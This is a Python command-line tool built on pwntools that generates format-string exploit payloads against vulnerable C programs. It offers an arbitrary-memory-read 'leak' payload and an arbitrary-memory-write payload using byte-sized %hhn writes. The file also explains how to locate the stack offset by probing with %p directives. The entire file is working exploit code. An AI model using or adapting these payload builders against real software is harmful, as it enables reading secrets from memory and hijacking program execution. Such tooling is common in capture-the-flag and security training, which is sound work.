#!/usr/bin/env python3
"""format_string.py — format-string primitive builders for arbitrary read
(leak) and arbitrary write. Wraps pwnlib's ``fmtstr_payload`` for writes.

Usage
-----
    python format_string.py leak  --offset N --target ADDR [--arch {64|32}]
    python format_string.py write --offset N --target ADDR --value VAL [--arch {64|32}]

Find ``--offset`` by sending ``%1$p %2$p %3$p ...`` and counting where your
``AAAA`` echoes back. ``--target`` is the absolute address to read/write.

The leak layout is directive + NUL pad + address: the directive runs first,
then printf hits NUL, and the address sits at varargs slot ``offset`` to be
deref'd by ``%N$s``. The write layout is whatever pwnlib emits.
"""
from __future__ import annotations

import argparse
import sys

from pwn import context, p32, p64
from pwnlib.fmtstr import fmtstr_payload


def make_leak(offset: int, target_addr: int, arch: int = 64) -> bytes:
    """Directive first, NUL-padded to a word boundary, then the target
    address — so the address lands at varargs slot ``offset``."""
    if arch == 64:
        addr_bytes = p64(target_addr)
        word = 8
    elif arch == 32:
        addr_bytes = p32(target_addr)
        word = 4
    else:
        raise ValueError("arch must be 32 or 64")
    # Directive first, padded to a multiple of word, then address.
    directive = f"%{offset}$s".encode()
    pad = (-len(directive)) % word
    return directive + b"\x00" * pad + addr_bytes


def make_write(offset: int, target_addr: int, value: int, arch: int = 64) -> bytes:
    """``fmtstr_payload`` with byte-granular ``%hhn`` writes."""
    if arch == 64:
        context.bits = 64
    elif arch == 32:
        context.bits = 32
    else:
        raise ValueError("arch must be 32 or 64")
    return fmtstr_payload(offset, {target_addr: value}, write_size="byte")


def main() -> None:
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    leak = sub.add_parser("leak")
    leak.add_argument("--offset", type=int, required=True)
    leak.add_argument("--target", type=lambda s: int(s, 0), required=True)
    leak.add_argument("--arch", type=int, choices=[32, 64], default=64)

    write = sub.add_parser("write")
    write.add_argument("--offset", type=int, required=True)
    write.add_argument("--target", type=lambda s: int(s, 0), required=True)
    write.add_argument("--value", type=lambda s: int(s, 0), required=True)
    write.add_argument("--arch", type=int, choices=[32, 64], default=64)

    args = ap.parse_args()

    if args.cmd == "leak":
        payload = make_leak(args.offset, args.target, args.arch)
    elif args.cmd == "write":
        payload = make_write(args.offset, args.target, args.value, args.arch)
    else:
        sys.exit(2)

    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
